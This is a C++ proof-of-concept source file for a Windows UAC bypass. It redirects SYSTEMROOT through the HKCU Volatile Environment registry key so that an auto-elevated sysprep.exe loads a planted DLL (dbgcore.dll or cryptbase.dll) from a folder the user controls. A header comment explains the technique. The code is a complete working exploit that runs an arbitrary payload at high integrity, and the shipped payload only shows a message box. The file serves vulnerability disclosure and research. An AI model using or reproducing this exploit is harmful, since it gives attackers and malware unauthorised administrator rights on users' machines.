/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ║                                                                                      ║
 * ║   Sysprep Volatile Environment UAC Bypass Local Privilege Escalation                 ║
 * ║                                                                                      ║
 * ║   Discovered by bytecode77 (https://bytecode77.com)                                  ║
 * ║                                                                                      ║
 * ║   Full Download:                                                                     ║
 * ║   https://bytecode77.com/sysprep-privilege-escalation                                ║
 * ║                                                                                      ║
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   There is a known UAC bypass vulnerability that was first discovered in Windows 7   ║
 * ║   Release Candidate. Due to sysprep.exe being in a sub directory, DLL hijacking      ║
 * ║   was possible. In Windows 8 and above, this issue is fixed, Windows 7 is not        ║
 * ║   patched to this day.                                                               ║
 * ║                                                                                      ║
 * ║   So much for the past, moving on. Sysprep was patched by loading some DLL's from    ║
 * ║   a specific directory instead.                                                      ║
 * ║                                                                                      ║
 * ║   Let's look at Sysprep's manifest:                                                  ║
 * ║   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                  ║
 * ║                                                                                      ║
 * ║   <!--                                                                               ║
 * ║       Specifically load these DLLs from the specified path. This                     ║
 * ║       is done as a defence-in-depth approach to closing a known UAC                  ║
 * ║       exploit related to sysprep.exe being auto-elevated. The list                   ║
 * ║       need not contain KnownDlls since those are always loaded                       ║
 * ║       by the loader from the system directory.                                       ║
 * ║   -->                                                                                ║
 * ║   <file                                                                              ║
 * ║       loadFrom="%systemroot%\system32\actionqueue.dll"                               ║
 * ║       name="actionqueue.dll"                                                         ║
 * ║       />                                                                             ║
 * ║   [...]                                                                              ║
 * ║                                                                                      ║
 * ║   So, now all vulnerable DLL's are loaded from %systemroot% instead. Basically       ║
 * ║   this makes exploitation still possible and even easier and more reliable.          ║
 * ║                                                                                      ║
 * ║   How to change %systemroot%?                                                        ║
 * ║   Simple: Through Volatile Environment.                                              ║
 * ║   Define your own %systemroot% in HKEY_CURRENT_USER\Volatile Environment and         ║
 * ║   Sysprep will load precisely the DLL's specified in the manifest from there.        ║
 * ║                                                                                      ║
 * ║   Very basic idea. In PoC, I figured out that for Windows 8/8.1 and for Windows 10   ║
 * ║   there are different DLL's. For Windows 10 it's "dbgcore.dll" and on Windows 8,     ║
 * ║   "cryptbase.dll" works. The other DLL's have to be copied to the new                ║
 * ║   %systemroot%, too, as they are loaded from there. For this, we just copy them      ║
 * ║   from their original location.                                                      ║
 * ║                                                                                      ║
 * ║   Then, as we execute sysprep.exe, it will load all DLL's. The original ones that    ║
 * ║   are just copies and our payload DLL as well.                                       ║
 * ║   In our payload DLL, we then restore the environment variable and run our code in   ║
 * ║   high IL. In this example, Payload.exe will be started, which is an exemplary       ║
 * ║   payload file displaying a MessageBox.                                              ║
 * ║                                                                                      ║
 * ║   Why more reliable? Because no explorer.exe injection with IFileOperation is        ║
 * ║   required anymore. This means only one DLL and less to worry about potential race   ║
 * ║   conditions.                                                                        ║
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */

#include <string>
#include <Windows.h>
#include <lm.h>
using namespace std;

#pragma comment(lib, "netapi32.lib")

void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value);
wstring GetTempFolderPath();
wstring GetStartupPath();
bool GetWindowsVersion(DWORD &major, DWORD &minor);

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Prepare our working directory that is later assigned to %SYSTEMROOT% through volatile environment
	// We will also use it to put Payload.exe there - Just an example file, can be any arbitrary executable
	wstring systemRoot = GetTempFolderPath() + L"\\SysprepVolatileEnvironmentLPE";
	CreateDirectoryW(systemRoot.c_str(), NULL);
	CreateDirectoryW((systemRoot + L"\\System32").c_str(), NULL);

	// Copy some specific DLL's from the original %SYSTEMROOT% which get loaded from our new directory
	CopyFileW(L"C:\\Windows\\System32\\ActionQueue.dll", (systemRoot + L"\\System32\\ActionQueue.dll").c_str(), FALSE);
	CopyFileW(L"C:\\Windows\\System32\\bcryptprimitives.dll", (systemRoot + L"\\System32\\bcryptprimitives.dll").c_str(), FALSE);
	CopyFileW(L"C:\\Windows\\System32\\unattend.dll", (systemRoot + L"\\System32\\unattend.dll").c_str(), FALSE);

	DWORD major, minor;
	GetWindowsVersion(major, minor);

	// Windows 10, or above? ;)
	if (major >= 10)
	{
		// Expand our directory structure to this directory as well
		CreateDirectoryW((systemRoot + L"\\System32\\Sysprep").c_str(), NULL);

		// Some more DLL's that are specific to Windows 10
		CopyFileW(L"C:\\Windows\\System32\\unattend.dll", (systemRoot + L"\\System32\\unattend.dll").c_str(), FALSE);
		CopyFileW(L"C:\\Windows\\System32\\wdscore.dll", (systemRoot + L"\\System32\\wdscore.dll").c_str(), FALSE);
		CopyFileW(L"C:\\Windows\\System32\\Sysprep\\unbcl.dll", (systemRoot + L"\\System32\\Sysprep\\unbcl.dll").c_str(), FALSE);

		// This is our DLL that is loaded and then executed as "dbgcore.dll"
		CopyFileW((GetStartupPath() + L"\\SysprepInject.dll").c_str(), (systemRoot + L"\\System32\\dbgcore.dll").c_str(), FALSE);
	}
	// Windows 8 and 8.1
	else if (major == 6 && minor >= 2)
	{
		// One more DLL that is specific to Windows 8 / 8.1
		CopyFileW(L"C:\\Windows\\System32\\wdscore.dll", (systemRoot + L"\\System32\\wdscore.dll").c_str(), FALSE);

		// This is our DLL that is loaded and then executed as "cryptbase.dll"
		CopyFileW((GetStartupPath() + L"\\SysprepInject.dll").c_str(), (systemRoot + L"\\System32\\cryptbase.dll").c_str(), FALSE);
	}
	// Windows 7 does not work this way. It works the "old fashion sysprep-way" that is still not patched. We all know that one...
	else
	{
		return 0;
	}

	// This is our payload. It can be any executable, but for now we just display a MessageBox with basic information and IL
	CopyFileW((GetStartupPath() + L"\\Payload.exe").c_str(), (systemRoot + L"\\Payload.exe").c_str(), FALSE);

	// HKEY_CURRENT_USER\Volatile Environment\SYSTEMROOT
	// -> This registry value will redirect some DLL loading attempts to the directory we just prepared
	SetRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"SYSTEMROOT", systemRoot);

	// Execute sysprep.exe
	// Continue reading in SysprepInject.cpp
	ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\Sysprep\\sysprep.exe", NULL, NULL, SW_SHOWNORMAL);
	return 0;
}



void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;

	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}
wstring GetTempFolderPath()
{
	wchar_t path[MAX_PATH];
	GetTempPathW(MAX_PATH, path);
	return wstring(path);
}
wstring GetStartupPath()
{
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, MAX_PATH);
	wstring pathStr = wstring(path);
	return pathStr.substr(0, pathStr.find_last_of(L"/\\"));
}
bool GetWindowsVersion(DWORD &major, DWORD &minor)
{
	LPBYTE rawData = NULL;
	if (NetWkstaGetInfo(NULL, 100, &rawData) == NERR_Success)
	{
		WKSTA_INFO_100* workstationInfo = (WKSTA_INFO_100*)rawData;
		major = workstationInfo->wki100_ver_major;
		minor = workstationInfo->wki100_ver_minor;
		NetApiBufferFree(rawData);
		return true;
	}
	else
	{
		return false;
	}
}